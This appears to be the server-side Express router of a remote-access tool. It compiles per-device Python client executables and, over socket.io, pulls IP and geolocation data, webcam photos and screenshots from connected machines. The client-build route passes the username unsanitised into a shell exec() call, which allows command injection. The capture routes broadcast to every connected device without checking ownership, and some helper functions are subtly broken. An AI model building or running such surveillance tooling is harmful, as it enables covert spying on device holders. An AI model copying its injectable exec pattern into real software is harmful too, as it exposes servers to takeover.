var express = require('express');
var router = express.Router();
var path = require('path');
var User = require('../models/user');
var Device = require('../models/device');
var bcrypt = require('bcrypt');
var fs = require('fs');
var mkdirp = require('mkdirp');
var AdmZip = require('adm-zip');
const {exec} = require('child_process');
const saltRounds = 12;
const template = path.join(__dirname + '/../client_files/client_template.py');

function guid() {
    function s4() {
        return Math.floor((1 + Math.random()) * 0x10000)
    }
    return s4() + s4() + s4() + s4() + s4();
}

function zip_exe(zip_path, exe_path, callback) {   
    var zip = new AdmZip();

    zip.addLocalFile(exe_path);

    // write it to disk
    zip.writeZip(zip_path, function(err) {
        if(err) { return callback(error, false); }
        else {
            return callback(false, true);
        }
    }); 
}


function generate_exe(username, deviceId, output_dir, callback) {
    exec('pyinstaller --onefile '+username+deviceId+'.py', {
        cwd: output_dir
    }, function(err, stdout, stderr) {
        if(err) {
            return callback(err, false);
        } else {
            return callback(false, true);
        }
    });
}

function copy_file(source, dest, callback) {
    var readStream = fs.createReadStream(source);
    
    readStream.once('error', (err) => {
        return callback(err, false);
    });
    
    readStream.once('end', () => {});
    
    readStream.pipe(fs.createWriteStream(dest));
    
    return callback(false, true);
}

function edit_python_template(app_id, device_id, username, callback) {
    var client_file = path.join(__dirname + '/../client_files/'+username+device_id+'/'+username+device_id+'.py');
    
    
    fs.readFile(client_file, 'utf8', function(err, data) {
        if(err) { return callback(err, false); }
        
        var result = data.replace('TEMPAPPID', app_id);
        
        result = result.replace('TEMPDEVICEID', device_id);
        
        fs.writeFile(client_file, result, 'utf8', function(err) {
            if(err) { return callback(err, false); }
            else {
                return callback(false, true);
            }
        });
    });
}

// GET route for reading data 
router.get('/', function (req, res, next) {
	return res.render(path.join(__dirname + '/../frontend/index'));
});

// POST route for updating data 
router.post('/', function (req, res, next) {
	
	if (req.body.username && req.body.password &&
		req.body.passwordConf) {
			
		var userData = {
			username: req.body.username,
			password: req.body.password,
            appId: ''
		}
		
        bcrypt.genSalt(saltRounds, function(err, salt) {
            bcrypt.hash(userData.password, salt, function (err, hash) {
                if (err) {
                    return next(err);
                }
                userData.password = hash;
                
                bcrypt.genSalt(saltRounds, function(err, salt) {

                    bcrypt.hash(userData.username, salt, function (err, hash) {
                        if (err) { return next(err); }
                        else { 
                            userData.appId = hash;
                            
                            User.create(userData, function (error, user) {
                                if (error) {
                                    return next(error);
                                } else {
                                    req.session.userId = user._id;
                                    return res.redirect('/mainMenu');
                                }
                            });
                        
                        }
                    });
                });
                
            }); 
        });
	} else if (req.body.logUser && req.body.logPass) {
		User.authenticate(req.body.logUser, req.body.logPass, function (error, user) {
			if (error || !user) {
				const err = new Error('Wrong username or password.');
				err.status = 401;
				return next(err);
			} else {
                req.session.userId = user._id;
                return res.redirect('/mainMenu');                    
            }        
		});
        
	} else {
		const err = new Error('All fields required.');
		err.status = 400;
		return next(err);
	}
});


// GET route after registering or logging in
router.get('/mainMenu', function (req, res, next) {
	User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {                
                Device.find({appId: user.appId}).exec(function(err,device_results) {
                    if(err) { return next(err); }
                    return res.render(path.join(__dirname + '/../frontend/mainMenu'), {
                        devices: device_results,
                        user: user
                    });
                });
			}
		}
	});
});

// GET route to bring user to client download page 
router.get('/download', function (req, res, next) {
    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {             
                return res.render(path.join(__dirname + '/../frontend/download'), {
                    user: user
                });
			}
		}
	});
});

// POST route to take in device name and compile an executable client 
router.post('/download', function (req, res, next) {
    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {	
            var newDeviceId = guid();
            var deviceName = req.body.deviceName;
            
            var deviceData = {
                appId: user.appId,
                deviceId: newDeviceId,
                name: deviceName,
                socketId: '',
                connected: 'offline'
            };  
            
            Device.create(deviceData, function(error, device) {
                if(error) { return next(error); }
                
                //TODO: Dont allow any usernames outside a-zA-Z0-9
                
                else {
                    var client_folder = path.join(__dirname + '/../client_files/'+user.username+newDeviceId);
                    mkdirp(client_folder, function(err) {
                        if(err) { return next(err); }
                        else {
                            var client_file = client_folder+'/'+user.username+newDeviceId+'.py';
                            
                            copy_file(template, client_file, function(err, success) {
                                if(!err & success) {
                                    console.log("file copied");
                                    edit_python_template(user.appId, newDeviceId, user.username, function(err, success) {
                                        if(!err && success) {
                                            console.log("file edited");
                                            generate_exe(user.username, newDeviceId, client_folder, function(err, success) {
                                                if(!err && success) {
                                                    console.log("exe generated");                 
                                                    zip_exe(client_folder+'/exe.zip', client_folder+'/dist/'+user.username+newDeviceId+'.exe', function(err, success) {
                                                        if(!err && success) {
                                                            
                                                            console.log("zip file generated");
                                                            res.download(client_folder+'/exe.zip', user.username+deviceName+'.zip', function(err) {
                                                                if(err) { return next(err); }
                                                                else { 
                                                                    res.end();
                                                                    return;
                                                                }
                                                            });                                                            
                                                        } else {
                                                            return next(err);
                                                        }
                                                    });
                                                } else {
                                                    return next(err);
                                                }  
                                            });
                                        } else {
                                            return next(err);
                                        }
                                    });
                                } else {
                                    return next(err);
                                }                                                
                            });
                        }
                    });
                }                                        
            });                                 
        }		
	});
});


/* router.param('socketId', function(req, res, next, socketId) {
   // TODO: verify that the users appId owns the devices socketId
    // TODO: verify that the socketID is connected
    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {                
                return next();
			}
		}
	}); 
}); */

function createPromise(socket, command) {
    return new Promise(function (res, rej) {
        socket.on(command, function(data) {
            if(!data) { 
                const err = new Error('Socket error');
                rej(err); 
            } else {
                res(data);
            } 
        });
    });
}


// GET route to bring user to device dashboard
router.get('/dashboard', function (req, res, next) {
    // TODO: verify that the users appId owns the devices socketId
    // TODO: verify that the socketID is connected
    
    console.log(req.query.socket);
    
    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {          
                //req.query.socket
               
                var sockets = req.app.io.nsps['/'].adapter.rooms;
                var socket_objs = [];

                for (sid in sockets) {
                    socket_objs.push(req.app.io.sockets.connected[sid]);
                }

                req.app.io.emit('get_ip_info', '');
                
                var promise = createPromise(socket_objs[0], 'send_ip_info');
                                
                promise.then(function (result) {
                    var client_ip = result.data.ip;
                    var client_org = result.data.org;
                    var client_city = result.data.city;
                    var client_country = result.data.country;
                    var client_region = result.data.region;
                    var client_loc = result.data.loc;
                     
                
                    res.render(path.join(__dirname + '/../frontend/dashboard'), {
                        user: user,
                        ip: client_ip,
                        org: client_org,
                        city: client_city,
                        country: client_country,
                        region: client_region,
                        loc: client_loc
                    });
                }).catch(function(err) {
                    // Disconnect socket
                    return res.redirect('/mainMenu');
                });
			}
		}
	});
});

router.get('/capture_webcam', function(req, res, next) {
    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {                
                //TODO: Fix how socket id is found.. use device.
                console.log("Capturing webcam photo");
                var sockets = req.app.io.nsps['/'].adapter.rooms;
                var socket_objs = [];

                for (sid in sockets) {
                    socket_objs.push(req.app.io.sockets.connected[sid]);
                }
                
                req.app.io.emit('take_webcam_picture', '');

                var promise = createPromise(socket_objs[0], 'send_webcam_picture');
                
                promise.then(function (result) {
                    fs.writeFile(__dirname + '/../frontend/uploads/webcam.jpg', result.buffer, 'base64', function(err) {
                        if(err){
                            const err = new Error('Socket error');
                            return next(err);     
                        }
                        else {
                            return res.redirect('back');
                        }
                    });
                }).catch(function(err) {
                    // Disconnect socket
                    return res.redirect('/mainMenu'); 
                });
			}
		}
	});
});


router.get('/capture_screenshot', function(req, res, next) {
    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {                
                console.log("Taking screenshot");
                var sockets = req.app.io.nsps['/'].adapter.rooms;
                var socket_objs = [];

                for (sid in sockets) {
                    socket_objs.push(req.app.io.sockets.connected[sid]);
                }

                req.app.io.emit('take_screenshot', '');
                
                var promise = createPromise(socket_objs[0], 'send_screenshot');
                
                promise.then(function (result) {
                    fs.writeFile(__dirname + '/../frontend/uploads/screenshot.jpg', result.buffer, 'base64', function(err) {
                        if(err){
                            const err = new Error('Socket error');
                            return next(err);     
                        }
                        else {
                            return;
                        }
                    });
                }).catch(function(err) {
                    // Disconnect socket
                    return res.redirect('/mainMenu');
                });
			}
		}
	});
});

// GET for logout 
router.get('/logout', function (req, res, next) {
    if (req.session) {
		// delete session object
		req.session.destroy(function (err) {
			if (err) {
				return next(err);
			} else {
				return res.redirect('/');
			}
		});
	}
});



module.exports = router;